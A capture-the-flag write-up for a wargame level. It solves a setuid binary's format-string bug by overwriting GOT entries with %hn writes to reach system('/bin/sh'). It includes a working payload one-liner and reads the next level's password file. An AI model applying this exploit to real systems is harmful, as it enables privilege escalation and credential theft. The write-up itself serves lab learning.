# level05

## Objective

Turn the format-string vulnerability into a `system("/bin/sh")` call and use
the resulting `level06` shell to read `/home/users/level06/.pass`.

## Vulnerability

The binary reads up to 99 bytes, lowercases ASCII uppercase letters, then uses
the input as a `printf` format string:

```c
printf(input);
exit(0);
```

The lowercase conversion does not prevent `%`, `$`, `h`, `n`, or raw GOT
addresses from being used. The payload uses lowercase `%hn` writes.

## Format-string index

Use this probe:

```sh
python -c 'print "AAAA." + ".".join(["%08x"] * 20)' | ./level05
```

The program lowercases `AAAA`, and the output contains `61616161` at the tenth
word. The first four-byte value placed at the beginning of input is therefore
format argument 10.

## GOT targets

`objdump -R ./level05` identifies:

```text
0x080497d4  printf@GOT
0x080497e0  exit@GOT
```

The binary is not PIE and `main` begins at `0x08048444`. ASLR is disabled, and
GDB resolved libc `system` to `0xf7e6aed0`.

## Three-stage redirection

The final `exit(0)` cannot directly become `system`, because it would invoke
`system(NULL)`. Supply three input lines in one pipeline:

1. Overwrite `exit@GOT` with `main` using two half-word writes. The process
   restarts and reads another line.
2. Overwrite `printf@GOT` with libc `system`, while `exit@GOT` still restarts
   the program.
3. Supply `/bin/sh`. The next `printf(input)` dispatches to
   `system("/bin/sh")`.

Run:

```sh
(python -c 'import sys; sys.stdout.write("\xe0\x97\x04\x08\xe2\x97\x04\x08%33852x%10$hn%33728x%11$hn\n"); sys.stdout.write("\xd4\x97\x04\x08\xd6\x97\x04\x08%44744x%10$hn%18710x%11$hn\n"); sys.stdout.write("/bin/sh\n")'; cat) | ./level05
```

The first `%hn` pair writes `0x08048444` to `exit@GOT`. The second pair writes
`0xf7e6aed0` to `printf@GOT`. Large padding output is expected: `%hn` writes
the number of characters printed so far.

Verify the effective identity and recover the next password:

```sh
id
cat /home/users/level06/.pass
```

Observed identity:

```text
uid=1005(level05) gid=1005(level05) euid=1006(level06) egid=100(users)
```

The recovered password is recorded in `flag`.